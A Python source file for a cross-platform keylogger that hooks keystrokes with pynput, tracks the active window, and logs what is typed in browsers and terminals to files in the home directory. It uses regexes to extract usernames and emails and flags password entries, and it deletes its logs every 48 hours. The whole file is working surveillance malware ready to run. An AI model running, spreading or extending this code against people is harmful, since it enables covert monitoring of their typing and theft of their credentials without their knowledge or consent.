import os
import subprocess
import platform
import time
import re
from pynput import keyboard
import threading
from datetime import datetime, timedelta
import signal
import sys

try:
    import win32gui  # Windows-specific
except ImportError:
    pass
try:
    from AppKit import NSWorkspace  # macOS-specific
except ImportError:
    pass

class KeyLogger:
    def __init__(self, target_apps=None):
        self.log_file = os.path.expanduser("~/log.txt")  # Save to user's home directory
        self.backup_log_file = os.path.expanduser("~/log_backup.txt")  # Backup log file
        self.current_input = ""  # Buffer for current input
        self.sensitive_data = []  # To store captured sensitive data (usernames/passwords)
        self.target_apps = target_apps if target_apps else []  # List of target applications
        self.current_window = ""  # To track the current active window
        self.last_logged_app = ""  # To track the last logged application
        self.app_start_time = None  # To track when an app was first activated
        self.start_time = datetime.now()  # Track the start time for log retention

        try:
            with open(self.log_file, "w") as f:
                f.write("Keylogger Started.\n")
            print(f"Log file created at: {self.log_file}")
        except Exception as e:
            print(f"Error creating log file: {e}")
            self.log_file = None

        try:
            with open(self.backup_log_file, "w") as f:
                f.write("Backup log file created.\n")
            print(f"Backup log file created at: {self.backup_log_file}")
        except Exception as e:
            print(f"Error creating backup log file: {e}")
            self.backup_log_file = None

        # Handle shutdown signals
        signal.signal(signal.SIGTERM, self.handle_shutdown)
        signal.signal(signal.SIGINT, self.handle_shutdown)

        threading.Thread(target=self.cleanup_logs, daemon=True).start()

    def append_to_log(self, string, is_backup=False):
        if self.log_file:
            try:
                target_file = self.backup_log_file if is_backup else self.log_file
                with open(target_file, "a") as f:
                    f.write(string)
                    f.flush()  # Ensure data is written immediately
            except Exception as e:
                print(f"Error writing to log file: {e}")

    def capture_sensitive_data(self):
        if "username" in self.current_input.lower() or "email" in self.current_input.lower():
            match = re.search(r"\busername[: ]*(\S+)|\bemail[: ]*(\S+)", self.current_input, re.IGNORECASE)
            if match:
                username = match.group(1) or match.group(2)
                self.sensitive_data.append(f"Captured Username/Email: {username}\n")
                self.append_to_log(f"Captured Username/Email: {username}\n")

        if "password" in self.current_input.lower():
            self.sensitive_data.append(f"Captured Password: ********\n")
            self.append_to_log("Captured Password: ********\n")

        self.current_input = ""  # Reset input buffer after checking

    def log_keystroke(self, key):
        try:
            current_key = str(key.char)  # Regular characters
        except AttributeError:
            if key == keyboard.Key.space:
                current_key = " "
                self.current_input += current_key
            elif key == keyboard.Key.enter:
                current_key = "\n"
                self.append_to_log(self.current_input + "\n")
                self.capture_sensitive_data()
                self.current_input = ""  # Reset the input buffer
            elif key == keyboard.Key.backspace:
                current_key = " [BACKSPACE] "
                self.current_input = self.current_input[:-1]  # Simulate backspace
            elif key == keyboard.Key.tab:
                current_key = " [TAB] "
                self.current_input += current_key
            else:
                current_key = f" [{key}] "  # Special keys like Ctrl, Alt

        self.append_to_log(current_key)

    def get_active_window(self):
        system = platform.system()
        if system == "Linux":
            return self.get_active_window_linux()
        elif system == "Windows":
            return self.get_active_window_windows()
        elif system == "Darwin":  # macOS
            return self.get_active_window_mac()
        else:
            return "Unknown Window (Unsupported OS)"

    def get_active_window_linux(self):
        try:
            result = subprocess.run(
                ["xdotool", "getwindowfocus", "getwindowname"],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )
            return result.stdout.strip()
        except FileNotFoundError:
            return "Unknown Window (xdotool not installed)"

    def get_active_window_windows(self):
        try:
            window = win32gui.GetForegroundWindow()
            return win32gui.GetWindowText(window)
        except Exception:
            return "Unknown Window"

    def get_active_window_mac(self):
        try:
            active_app = NSWorkspace.sharedWorkspace().frontmostApplication()
            return active_app.localizedName() if active_app else "Unknown Window"
        except Exception:
            return "Unknown Window"

    def on_key_press(self, key):
        active_window = self.get_active_window()
        current_time = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())

        if active_window != self.current_window:
            if self.current_window != "":
                if self.app_start_time:
                    app_duration = time.time() - self.app_start_time
                    self.append_to_log(f"[{self.current_window}] used for {app_duration / 60:.2f} minutes\n")
                    self.append_to_log(f"[{self.current_window}] closed at {current_time}\n")

            self.current_window = active_window
            self.app_start_time = time.time()
            self.append_to_log(f"\n[Switched to: {self.current_window} at {current_time}]\n")
            self.current_input = ""

        for app in self.target_apps:
            if app.lower() in self.current_window.lower():
                if app.lower() != self.last_logged_app:
                    self.append_to_log(f"[{current_time}] Application Opened: {app}\n")
                    self.last_logged_app = app.lower()
                break

        if any(app.lower() in self.current_window.lower() for app in self.target_apps):
            self.log_keystroke(key)

    def is_within_work_hours(self):
        current_time = time.localtime()
        return 9 <= current_time.tm_hour < 17

    def save_to_backup(self):
        try:
            if os.path.exists(self.log_file):
                with open(self.log_file, "r") as f:
                    logs = f.read()
                with open(self.backup_log_file, "a") as bf:
                    bf.write(logs)
                print("Logs successfully saved to backup file.")
            else:
                print("No logs to backup.")
        except Exception as e:
            print(f"Error saving logs to backup file: {e}")

    def handle_shutdown(self, signum, frame):
        print("Shutdown signal received. Saving logs to backup file.")
        self.save_to_backup()
        sys.exit(0)  # Exit the script cleanly

    def cleanup_logs(self):
        while True:
            if datetime.now() - self.start_time >= timedelta(hours=48):
                if os.path.exists(self.log_file):
                    os.remove(self.log_file)
                if os.path.exists(self.backup_log_file):
                    os.remove(self.backup_log_file)

                self.start_time = datetime.now()
            time.sleep(60)

    def start(self):
        key_listener = keyboard.Listener(on_press=self.on_key_press)
        key_listener.start()

        try:
            while True:
                if not self.is_within_work_hours():
                    time.sleep(300)
                else:
                    time.sleep(1)
        except KeyboardInterrupt:
            print("Keylogger stopped.")

# Example usage
if __name__ == "__main__":
    target_apps = ["chrome", "firefox", "terminal", "gnome-terminal", "xterm", "cmd.exe", "powershell", "Safari"]
    keylogger = KeyLogger(target_apps=target_apps)
    keylogger.start()
